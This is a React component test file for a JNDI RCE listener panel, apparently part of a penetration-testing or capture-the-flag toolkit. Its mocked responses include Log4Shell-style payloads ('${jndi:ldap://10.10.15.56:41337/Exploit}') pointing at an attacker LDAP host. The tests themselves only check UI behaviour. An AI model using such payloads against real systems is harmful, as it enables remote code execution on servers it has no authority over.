// @vitest-environment jsdom
import { cleanup, fireEvent, render, screen } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import { afterEach, expect, it, vi } from "vitest";
import JndiRceListenerPanel from "./JndiRceListenerPanel";

afterEach(() => {
  cleanup();
  vi.unstubAllGlobals();
});

const renderPanel = () => {
  const client = new QueryClient({ defaultOptions: { queries: { retry: false } } });
  return render(<QueryClientProvider client={client}><JndiRceListenerPanel /></QueryClientProvider>);
};

it("auto-fills LHOST from tun0 and starts the listener with the typed LPORT", async () => {
  let startBody: Record<string, unknown> | undefined;
  vi.stubGlobal("fetch", vi.fn((input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url.endsWith("/api/vpn/status")) return Promise.resolve(new Response(
      JSON.stringify({ tun0: "tun0 UNKNOWN 10.10.15.56/23" }),
      { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/jndi-listener/status")) return Promise.resolve(new Response(
      JSON.stringify({ running: false, javac_available: true }),
      { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/jndi-listener/start") && init?.method === "POST") {
      const body = JSON.parse(String(init.body));
      startBody = body;
      return Promise.resolve(new Response(JSON.stringify({
        running: true, javac_available: true, ldap_port: 41337, http_port: 48080,
        lhost: body.lhost, lport: body.lport,
        jndi_payload: `\${jndi:ldap://10.10.15.56:41337/Exploit}`,
      }), { headers: { "Content-Type": "application/json" } }));
    }
    throw new Error(`Unhandled request: ${url}`);
  }));
  renderPanel();

  await screen.findByDisplayValue("10.10.15.56");
  fireEvent.change(screen.getByLabelText("LPORT"), { target: { value: "9001" } });
  fireEvent.click(screen.getByText("리스너 시작"));

  await vi.waitFor(() => expect(startBody).toEqual({ lhost: "10.10.15.56", lport: 9001 }));
  expect(await screen.findByText("$" + "{jndi:ldap://10.10.15.56:41337/Exploit}")).toBeTruthy();
  expect(screen.getByText(/LDAP 41337/)).toBeTruthy();
  expect(screen.getByText(/HTTP 48080/)).toBeTruthy();
});

it("stops the listener and hides the payload once stopped", async () => {
  let running = true;
  vi.stubGlobal("fetch", vi.fn((input: RequestInfo | URL, init?: RequestInit) => {
    const url = String(input);
    if (url.endsWith("/api/vpn/status")) return Promise.resolve(new Response(
      JSON.stringify({ tun0: "" }), { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/jndi-listener/status")) return Promise.resolve(new Response(
      JSON.stringify(running
        ? { running: true, javac_available: true, ldap_port: 1, http_port: 2,
            lhost: "10.10.15.56", lport: 9001, jndi_payload: "${jndi:ldap://x/Exploit}" }
        : { running: false, javac_available: true }),
      { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/jndi-listener/stop") && init?.method === "POST") {
      running = false;
      return Promise.resolve(new Response(JSON.stringify({ running: false, javac_available: true }),
        { headers: { "Content-Type": "application/json" } }));
    }
    throw new Error(`Unhandled request: ${url}`);
  }));
  renderPanel();

  await screen.findByText("리스너 중지");
  fireEvent.click(screen.getByText("리스너 중지"));

  await screen.findByText("리스너 시작");
  expect(screen.queryByText(/실행 중/)).toBeFalsy();
});

it("warns instead of letting the operator start a listener when javac is missing", async () => {
  vi.stubGlobal("fetch", vi.fn((input: RequestInfo | URL) => {
    const url = String(input);
    if (url.endsWith("/api/vpn/status")) return Promise.resolve(new Response(
      JSON.stringify({ tun0: "" }), { headers: { "Content-Type": "application/json" } }));
    if (url.endsWith("/api/jndi-listener/status")) return Promise.resolve(new Response(
      JSON.stringify({ running: false, javac_available: false }),
      { headers: { "Content-Type": "application/json" } }));
    throw new Error(`Unhandled request: ${url}`);
  }));
  renderPanel();

  expect(await screen.findByText(/sudo apt install default-jdk/)).toBeTruthy();
});
